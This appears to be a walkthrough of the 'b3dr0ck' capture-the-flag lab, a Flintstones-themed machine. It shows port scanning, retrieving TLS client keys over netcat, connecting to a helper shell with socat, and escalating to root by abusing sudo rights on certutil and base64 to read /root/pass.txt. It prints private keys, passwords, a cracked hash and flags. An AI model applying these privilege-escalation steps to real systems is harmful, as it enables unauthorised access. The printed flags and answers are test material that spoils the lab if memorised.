# b3dr0ck

Fred Flintstone   &   Barney Rubble!

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
Can you find all the Easter eggs?

---

nmap scan 

```abap
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
4040/tcp  open  yo-main syn-ack ttl 64
9009/tcp  open  pichat  syn-ack ttl 64
54321/tcp open  unknown syn-ack ttl 64
```

Going to the website we get this 

```abap
Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

Pivoting a little bit I set up a `nc bedrock.thm 9009`and we get this. You can look at the room and the hints it provides for you in order to find the next clue. Typing cert and key get this.

```abap
client certificate

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTA5MTIwMDMxMDVaFw0yNjA5MTIwMDMxMDVaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC1SbEg
PW9cF/46R91MN2VbxEWC6TiEnW8H7dkeCTagsOJytuoE0oq9DTrJvZhR9el1TVlC
Ro141IV4x42k2qStBKRV3W/azjJYKi5qSqickJ522rZ78NTZnUb8aR3oqAUS84QO
fkBGuvh6NDy2xQ1xhdOAlRmxFzvFXMPu4FUCsJNrKZC5UN/kkoGjsXM0kO01NXTG
usa1Dr9pMYzbQ9zwq2jjSEMY64ixyfRdZfValwhbJRtLg/YUPU/MNIVdpPXzN0YU
myl/qjkwsJSvUSUx+bUEKMIwU16VkBDKE2820+UuBj5gL7HPW7qSsicQeIHBfHDo
DajjUCYgNhGStSkfAgMBAAEwDQYJKoZIhvcNAQELBQADggEBABs83fhaCL19wvd3
So9E1EMcJaRJ1SS74FU6uQbnoLKpkpMTocHInGCmyMMmUHQyELnFMfzelyBeTjE9
ECkRFYMKHxSSQzsRWXUfQ0R/PoABeInfThtBvXCrf+WsbUVk96/OJke7SgYDNX3P
z9B72CDoEuMcBPdgbGYvLkBTcwT/U8XD+PQ1FGQzy/wsTz0JbnJRaSlat3VlEae0
T5qceH7J53UvfpwaQDKu3vmAl08hQFlaLnu2Cs8j9aVK0A/GMEoEJZWLkDkHD3Fi
wHDAyRfItUOz/S5fmub7liPLz4GI+/IEgRaKgqX/mOsBJ546S+Z4uQtJJYPiuoF2
QYCA8Kc=
-----END CERTIFICATE-----
```

```abap
private key

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtUmxID1vXBf+OkfdTDdlW8RFguk4hJ1vB+3ZHgk2oLDicrbq
BNKKvQ06yb2YUfXpdU1ZQkaNeNSFeMeNpNqkrQSkVd1v2s4yWCouakqonJCedtq2
e/DU2Z1G/Gkd6KgFEvOEDn5ARrr4ejQ8tsUNcYXTgJUZsRc7xVzD7uBVArCTaymQ
uVDf5JKBo7FzNJDtNTV0xrrGtQ6/aTGM20Pc8Kto40hDGOuIscn0XWX1WpcIWyUb
S4P2FD1PzDSFXaT18zdGFJspf6o5MLCUr1ElMfm1BCjCMFNelZAQyhNvNtPlLgY+
YC+xz1u6krInEHiBwXxw6A2o41AmIDYRkrUpHwIDAQABAoIBABi127veQ+CUsKV3
CDYMUveIMEVgzsBcyTaWeAK9FMIgei1Su2E+5YRRWlMHUczSLSk9Cs6a2UvABBVr
deYjm1CuEkxV65oygvA7h6obVRJKMB9ZPoh0Uj77TiK3nUkKJe7oXHaxRMefUqEt
n5z2DRgNOsALEr5twUrskxRrZYsBFZTzJ+ejgQ071mQ1Tanb2I94I3RO/9BE9Ux3
VaiQzlCK6/AQ0PBzVDdIjMEpiSk2/U+Qr7enA3XYuL5+ZELQ4zBtUXu2lAmbd76h
WrlbQBUvRWBDDNgscsXNC/idAgB+g+N673C82+wK+E6eH7A9EdI+ZVo6w763JcSa
o6qdjFECgYEA6r9XT19QPYNMidqSUMm7LzV1x0qAz6F3Ozrm3Qx9hgA5AXV/7NoV
2B8yvyhDU73YrFXu2alpfo4FBMQCkmkpnuESMXCxAU6vpEOnlylkFLUPkHgvpX1V
Yqq97zT/qq2vFl5dZZ2mUa4clbu+TPAZ2GWYxKDK/JxPMo8es9i3OJkCgYEAxbNW
UIR2KzMjMCd4x5idj5fQyd9P4oVtWC3QqIgQDQVU5sF4aQI3QBoXZJ2kU8GX22Np
AE/6Vpm7CqkTdtUKOkoZVWCYhKLSXWJiyy4BMsAMt3XAR9n1VLh5acfyBRZawm5f
FXdqff585DMTMeUVcG+Dgk4xOJnMlG4WpFT+6ncCgYAEZvQvM91gWe78gtHNnArb
lsgPpbEGs8N1o+QibxKHiceH5HkyquBP/j3IYevpTR0cFjx1bnzg967WaQqXTkuO
hDAAJ1naaWxXy0EAT7FlxgN1tRtHojMQt5z6OGc2/yzSYZCk0DEHRRmaITwvWy1Q
5o7X2SAVXqUJkK+FteGxuQKBgA7wNh1vZN5uxsHkuaObTIyFFCmszgR3wINhMtsJ
LO1O8dNd2xNUL4iQcCQSJVCO2EKjiFOVt3zDsPZlQCtCfbtZzgA9hEjBZNPZk012
9HA5Qry6EQVc2sTEC6iKiycHQWRfop+knk9W42j60wB6JtyQEIfQELgOJv8wMlXI
dlqRAoGBAOAxpa8wk5aOOANSg4iXJzr65HONYUOTf0VlpHAW2Ka2tLzuQzY1jD/A
6YYfsN09J4davs27d4NEhhuDSrsI/pzWXagHRkFG9MB8b6qRemjDiaeowaBJXsJq
ejzAWKmgmkZb+rPgwh1mhPGLVLEupwDFBjvf8XVLiSJcqgNL+gqf
-----END RSA PRIVATE KEY-----
```

But then typing help finally gets you this

```abap
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

So running this command we are presented will a shell

```abap
socat stdio ssl:bedrock.thm:54321,cert=cert,key=key,verify=0
```

Typing password we get this

```abap
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

After trying for a while to decode it and remove the hash I gave up and tried it as the actual password. So ssh in and you get barneys flag

> THM{f05780f08f0eb1de65023069d0e4c90c}
> 

Running `sudo -l` 

```abap
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-201-93-250:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-201-93-250:
    (ALL : ALL) /usr/bin/certutil
```

Certutil.exe is a command-line program installed as part of Certificate Services. You can use certutil.exe to display certification authority (CA) configuration information, configure Certificate Services, and back up and restore CA components. The program also verifies certificates, key pairs, and certificate chains. Running this we can create a new certificate and key for fred.

```abap
sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

```abap
sudo /usr/bin/certutil fred fred

Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
```

```abap
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA5hrzq8nkakTMQLSPujn96LK+tArsLfGaALRgcEE5kjtv/Ur+
PVIZQZrolgp2OWftuRyD2y3W0zd/iRsMTBdX3YYAUZBhPoqdE0gNw72cfViTf36n
AITeEUGhPx6U2CMGRKuA87bLLBbjCUScb9BrEsABhqKh8T5vtC7FiJgXLrYYFddV
V8F6ZrMAtOCKZwPiJgKI3AfEvqll2RS7v6L+FCZoZPr9tTpY0QsciYzz+Z4vsO0z
smnrjI2bVVqhjlPteXW3A4d/Ftq3acSbyK14RcoqyWbQQrk6yblweVMynHQ/j1pc
WwHVtfmttiz7UGuAwp+Y3quME0M5tZ9mHqO4aQIDAQABAoIBAQDTqytHdZqWXt79
DpvAFSSKcBKZEAseYEboKwUjffx1lhN4jwm8Ys802Ejn7IvAVugJBkAM2Ofqt/yr
pKP1QuvirSeR4Bx0KZJAcGGpE7zmWRqlh14cThzxBsxLgdgt0lorxRAEILxYvFzw
45p8CN7WCqXcsbICdwrOVtACzNVWcxCunYcv3Ct1p5wyyFfdaSNHaGNuwlrr7ThA
OCwNQ3d0VssyuwZxIHFsTbv3KvA1AVPe78BTsDjOCEAp4c4ZLlRcb/cYGcfM7Ctq
wMFKAwEkSpR0JTL7znXH5EjOXnb4S7iRZgIUWtBM7MUgKuFLrT+SEmB0jHrssw3D
k/D510RZAoGBAPclHv5w+WQdhUKW6Je6gIlaa4EIgD9OSvD8zm5VDUvphy0U8VWE
7yRAXy/giX4WfOceQy7ELyp3TXYjIbhsWcKyLFl1f+cgorou13uTiMsXsdGapXGF
xY0Ip5adJOzmkNrk3Uk5jiLiV4IVpjSsalctmhHxSoyAqelyj4FUIDX/AoGBAO5Z
ibbsnERPMhDt3wkhSRdqPOJGRvW/SLBFM7XdI2vucvgK9LeV5gK8AXRufEYh1a9V
1NoRzcFAdSx/3TR39yvLWnAlNzajpJGfMS/1ZQn1fc8t4c7W5l9HW8C6Gh8fzuNH
+BQzALyNV5PWvqtviIzXSHT8hrNI7GoCdU3zUiGXAoGBAJDx8G+BioIw3grjvp3d
/6yOnyYZ+j0micU0P01uDFJNL7483h0tzaMRLcJCieCtB6v0j6pJ3O+m8IMsr4Yd
5bbOEDyXMOA4v7c56Z7MNBoIV316mTUvI2FHhiJLH3Dg+Guodi+P1dCXtoLQd53E
0Mk4MXf8b6BfhUcorQlIcWu5AoGAYVdF6+Pz6d3iF5HeDa9/V0W2+b4zyrdFK2AH
v1VB2xl18KEg0j0ww5seiPt6W3YD++h01l6BBlSZxgOuRnhcBJG3LKe2ReVNF3/J
KcnxasDMkakuWDfhu7W73hjjBCUMbDv/L9ioi1i6FJGWKxOQ09w0JjrflCbLDnxU
hfJCb58CgYEAgmTpGIT3EpGcWvGF5F2btNG+1MgUNVK64utX2fX0LCB3FLop5h7L
CPYzvsQKPGmv/sMalkqnT72iT5RLGuBJ+7VZe9PoEAaMtE7RAwskG2rXQd1+NwwF
lhzdcT9hI5uM3TLqovbGZSAqL+kq5FwfGaXayQiBJbUCfjA8e/uoGFw=
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
MIICmDCCAYACAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTA5MTIwMTMzMTlaFw0yNTA5MTMwMTMzMTlaMA8xDTALBgNVBAMMBGZy
ZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDmGvOryeRqRMxAtI+6
Of3osr60Cuwt8ZoAtGBwQTmSO2/9Sv49UhlBmuiWCnY5Z+25HIPbLdbTN3+JGwxM
F1fdhgBRkGE+ip0TSA3DvZx9WJN/fqcAhN4RQaE/HpTYIwZEq4DztsssFuMJRJxv
0GsSwAGGoqHxPm+0LsWImBcuthgV11VXwXpmswC04IpnA+ImAojcB8S+qWXZFLu/
ov4UJmhk+v21OljRCxyJjPP5ni+w7TOyaeuMjZtVWqGOU+15dbcDh38W2rdpxJvI
rXhFyirJZtBCuTrJuXB5UzKcdD+PWlxbAdW1+a22LPtQa4DCn5jeq4wTQzm1n2Ye
o7hpAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAHy1C3ICxZfeJoIvfKTZyKzPeXMO
SuvcV1H/pyiKvarYOtr6DgMo7qZGMaaRXcj2TPB0z3IjJoNiPLyu6+mJ0Nx15Fiz
WlbisT+FLPBy7tmGsZEJuFNq/jvo2LUCeYbTjuvWUw5q7G/S/8/LCKUrIysc7NaB
wZE46E2Q6ikqfH6mRf8dBZl6L8mVm65DwoU29s7fa6vbiopn6FaM/UAoPE+86GdI
Wz7r6rZBh+JNe7AAA49HzulQIG0lAgaM+6Mvv5HXtyXMs8nBMO8fbbkTy9Tx4TCC
RH5gcPRbLLsJ2zXXJuUXDFhEpvLUZOC3882FdQX9SLgoco5dr2PFaeHYe6E=
-----END CERTIFICATE-----
```

Now that we have a key and cert we can do the same thing as we did to barney 

```abap
socat -d -d -v - OPENSSL:bedrock.thm:54321,cert=fredcert,key=ferdkey,cafile=ca.pem,verify=0
```

```abap
b3dr0ck> help
> 2025/09/12 02:37:40.705664  length=5 from=8 to=12
help
< 2025/09/12 02:37:40.706428  length=57 from=838 to=894
Password hint: YabbaDabbaD0000! (user = 'fred')
b3dr0ck> Password hint: YabbaDabbaD0000! (user = 'fred')
b3dr0ck> 
```

now that we have fred password we can switch user to fred and get the second flag 

> THM{08da34e619da839b154521da7323559d}
> 

Again we do `sudo -l`

```abap
fred@ip-10-201-93-250:~$ sudo -l
Matching Defaults entries for fred on ip-10-201-93-250:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-201-93-250:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

```abap
fred@ip-10-201-93-250:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

```abap
fred@ip-10-201-93-250:~$ printf 'TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==' \
> | base64 -d | base32 -d | base64 -d

a00a12aad6b7c16bf07032bd05a31d56
```

After that you go to crackstation and get the hashed of the output

```abap
Hash	Type	Result
a00a12aad6b7c16bf07032bd05a31d56	md5	flintstonesvitamins
```

Then you can switch to root and get the flag 

> THM{de4043c009214b56279982bf10a661b7}
>
